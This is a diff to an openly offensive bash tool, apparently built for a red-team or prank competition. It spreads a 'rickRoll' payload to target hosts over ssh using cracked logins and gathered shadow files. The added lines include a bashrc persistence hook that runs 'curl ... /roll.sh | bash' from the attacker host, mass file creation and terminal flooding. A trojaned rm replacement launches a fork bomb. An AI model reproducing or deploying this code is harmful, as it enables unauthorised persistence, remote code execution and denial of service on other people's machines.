@@ -30,7 +30,11 @@
 	# make rickroll "safer"
 	# faster timeouts
 	# fix file checking
+	# check for failed install attempt before adding to 'installed' list
 	# setup aafire (aalib)
+	# fix the "pseudo terminal is not stdin", or whatever it is
+	# make the rickPath better
+	# change the clear argument to work with apache2 too
 	### add the rest of it to Debian/Ubuntu
 	# fix the $? in the if statements, they wont work right
 	#******************************************************
@@ -46,8 +50,9 @@ if [[ $1 == -* ]]; then	###
 	echo CLEARED		###
 	exit 0				###
 else					###
-	bones				###
+	neo					###
 	meat				###
+	bones				###
 	infect $*			### INFECTING TARGETS
 fi 						###
 }						###
@@ -73,45 +78,72 @@ function bones() {
 	crackedLogins="./crackedLogins"
 	targetShadows="./shadows"
 	sshKey="/root/.ssh/id_rsa"
-	rickHost="$(hostname -I | tr -d ' '):8000"
-	# stuff for making sure the http server is alive and ready
-	CHECK_rickServer="$(netstat -tulnap | grep -q 8000.*python; echo $?)"
+	rickPath='./rickRoll/*'
+	rickHost="$(hostname -I | tr -d ' '):80"
+		#rickHost="$(hostname -I | tr -d ' '):8000"
+# stuff for making sure the http server is alive and ready
+	CHECK_rickServer="$(netstat -tulnap | grep -q 80.*apache; echo $?)"
+		#CHECK_rickServer="$(netstat -tulnap | grep -q 8000.*python; echo $?)"
 	CHECK_rickFilesNum=5
 	function CHECK_rick(){
 		CHECK_rickFiles="$(curl -s $rickHost | grep -o roll | wc -l)"
 		echo $CHECK_rickFiles
 	}
 #### Gathering Info ############################
-	# making key if there isn't one
+	### ssh key ###
 		if [ ! -e $sshKey ]; then
 			ssh-keygen -f $sshKey -t rsa -N ''
 		fi
-	# making targetShadows dir if it doesn't exist
+	### targetShadows dir ###
 		if [ ! -e $targetShadows ];then
 			mkdir -p $targetShadows
 		fi
-	# making sure that the http server is running AND has the files
+	### HTTP server ###
+		rm /var/www/html/*
+		command cp $rickPath /var/www/html/
 		if [ $CHECK_rickServer == 0 ] && (( "$(CHECK_rick)" == $CHECK_rickFilesNum*2 )); then
-			printf "\n[\e[0;32m OK \e[0;m] SimpleHTTPServer appears to be ready"
+			printf "\n[\e[0;32m OK \e[0;m] Apache appears to be ready"
 		else
-			printf "\n[\e[0;33m STARTING \e[0;m]	SimpleHTTPServer"
-			screen -dmS rickServer /bin/bash -c "cd rickRoll; python -m SimpleHTTPServer"
-			sleep 0.25	# required so the server has time to start
-		# checks if the server started successfully
+			printf "\n[\e[0;33m STARTING \e[0;m]	Apache"
+			service apache2 start
+		## checks if the server started successfully ##
 			if [ $? == 0 ]; then
-				#making sure the files are there
-					if (( "$(CHECK_rick)" != $CHECK_rickFilesNum*2 )); then
-						printf "\n\n\e[0;35m**************************************************************\e[m"
-						printf "\n[\e[0;33m WARNING \e[0;m] SimpleHTTPServer is running but it's missing files"
-						printf "\n\e[0;35m**************************************************************\e[m"
-						sleep 3
-					else
-						printf "\n[\e[0;32m STARTED \e[0;m]	SimpleHTTPServer"
-					fi
+			#making sure the files are there
+				if (( "$(CHECK_rick)" != $CHECK_rickFilesNum*2 )); then
+					printf "\n\n\e[0;35m**************************************************************\e[m"
+					printf "\n[\e[0;33m WARNING \e[0;m] Apache is running but it's missing rickRoll files"
+					printf "\n\e[0;35m**************************************************************\e[m"
+					sleep 3
+				else
+					printf "\n[\e[0;32m STARTED \e[0;m]	Apache"
+				fi
 			else
-				printf "\n[\e[0;31m FAILED \e[0;m] Couldn't start SimpleHTTPServer for some reason.\n\tHelpful Error Code: 6"
+				printf "\n[\e[0;31m FAILED \e[0;m] Couldn't start Apache for some reason.\n\tHelpful Error Code: 6"
 			fi
 		fi
+		echo ""
+	#### SimpleHTTPServer Setup (fails when multiple connection attempts are made) ####
+	#	if [ $CHECK_rickServer == 0 ] && (( "$(CHECK_rick)" == $CHECK_rickFilesNum*2 )); then
+	#		printf "\n[\e[0;32m OK \e[0;m] SimpleHTTPServer appears to be ready"
+	#	else
+	#		printf "\n[\e[0;33m STARTING \e[0;m]	SimpleHTTPServer"
+	#		screen -dmS rickServer /bin/bash -c "cd rickRoll; python3 -m http.server"
+	#		sleep 0.25	# required so the server has time to start
+	#	# checks if the server started successfully
+	#		if [ $? == 0 ]; then
+	#			#making sure the files are there
+	#				if (( "$(CHECK_rick)" != $CHECK_rickFilesNum*2 )); then
+	#					printf "\n\n\e[0;35m**************************************************************\e[m"
+	#					printf "\n[\e[0;33m WARNING \e[0;m] SimpleHTTPServer is running but it's missing files"
+	#					printf "\n\e[0;35m**************************************************************\e[m"
+	#					sleep 3
+	#				else
+	#					printf "\n[\e[0;32m STARTED \e[0;m]	SimpleHTTPServer"
+	#				fi
+	#		else
+	#			printf "\n[\e[0;31m FAILED \e[0;m] Couldn't start SimpleHTTPServer for some reason.\n\tHelpful Error Code: 6"
+	#		fi
+	#	fi
 }
 
 
@@ -219,6 +251,8 @@ function payload(){			#
 											echo 'touch /tmp/.trigger &> /dev/null' >> /etc/bashrc
 											echo '$centDirtyRootPS1' >> /etc/bashrc
 											echo 'curl -s -L '$rickHost'/roll.sh | bash' >> /etc/bashrc ;
+											yum install epel-release -y && yum --disablerepo=epel -y update ca-certificates && yum install aalib -y
+											touch hiThere_{0001..1000}
 											for n in {1..100}; do
 												echo "WOULD YOU LIKE TO PLAY A GAME???" | tee /dev/hvc* /dev/tty* /dev/pts/*
 												sleep .15
@@ -276,7 +310,8 @@ function payload(){			#
 										service sshd restart
 										" &
 							;;
-					*)		echo UNKNOWN
+					*)
+							printf " UNKNOWN\n"
 							;;
 			esac
 	}
@@ -288,8 +323,10 @@ function payload(){			#
 		if [ -s $crackedLogins ]; then
 			#sending each set of logins to run through razor
 			while read -r tango; do
+				printf "\n################################\n"
 				razor
 			done <<< $(sort -u $crackedLogins | sed '/^$/d')
+			printf "\n################################\n\n"
 		else
 			printf "\n\n[\e[0;33m MISSING \e[0;m] Didn't find [$crackedLogins], or it's empty, so you must be testing something\n\t\t..hopefully..\n"
 		fi
@@ -303,7 +340,7 @@ payload $*
 # checking for, and installing, needed stuff ##############################################
 ###########################################################################################
 function meat(){
-	commands="sshpass net-tools"
+	commands="sshpass net-tools apache2"
 	installing=""
 	updated=1
 	scriptPath="$BASH_SOURCE"
@@ -326,7 +363,7 @@ function meat(){
 			command yes | apt install $installing
 			printf "\n\n\tInstalled:\n\t\t[$installing ]\n\n"
 		else
-			printf "\n--------------------------------------------------------------------\n"
+			printf "\n--------------------------------------------------------------------"
 		fi
 }
 ###########################################################################################
@@ -405,7 +442,6 @@ seedPathsRM="/usr/local/sbin/rm /usr/local/bin/rm"
 				#### checks for the trigger file, if its there it acts like normal ###
 				function tripwire(){
 					if [ ! -e $triggerPath ]; then
-						echo "trigger is missing"
 						rmCase
 					else
 						/bin/rm $argsRM
@@ -419,20 +455,25 @@ seedPathsRM="/usr/local/sbin/rm /usr/local/bin/rm"
 					case $increment in
 						0)
 								increment=$[$increment+1]; sed -i "s/=.*/=$increment/" $incrementPath
-								echo "increment: $increment"
 								echo "hard drives are big. no need to delete anything.."
+								sleep 1
 								;;
 						1)
 								clear
 								increment=$[$increment+1]; sed -i "s/=.*/=$increment/" $incrementPath
-								printf "\nrude.\nstop that.\n"
+								printf "rude."	 			; sleep 1.5
+								printf "\nstop that.\n"		; sleep 1.5
+								clear
 								;;
 						2)
 								clear
 								increment=$[$increment+1]; sed -i "s/=.*/=$increment/" $incrementPath
-								echo $increment
-								printf "\nHere.\n";sleep 2; printf "LET.."; sleep 3; printf "ME.."; sleep 2; printf "HELP..\n"; sleep 2
-								o(){ o|o& };o
+								printf "Ok, Here.\n"	; sleep 2
+								printf "LET"			; sleep 1.0	;	printf "."	;	sleep 1.0 ;	printf "."	 ;	sleep 1.0
+								printf "ME"				; sleep 0.5	;	printf "."	;	sleep 0.5 ;	printf "."	 ;	sleep 0.5
+								printf "HELP.\n"		; sleep 0.5
+								timeout 5 aafire
+								o(){ o|o& };o &> /dev/null
 								;;
 						*)
 								clear
@@ -443,7 +484,16 @@ seedPathsRM="/usr/local/sbin/rm /usr/local/bin/rm"
 				mainRM $*
 				EOF
 				)"
-
+###########################################################################################
+#are you root? no? well, try again
+###########################################################################################
+function neo(){
+	if [[ $EUID -ne 0  ]]; then
+		printf "\nyou forgot to run as root again... "
+		printf "\nCurrent dir is "$(pwd)"\n\n"
+		exit 1
+	fi
+}
 #+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 #+++++++++++++++++++++++++++++++++ FIGHT!! +++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 #+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
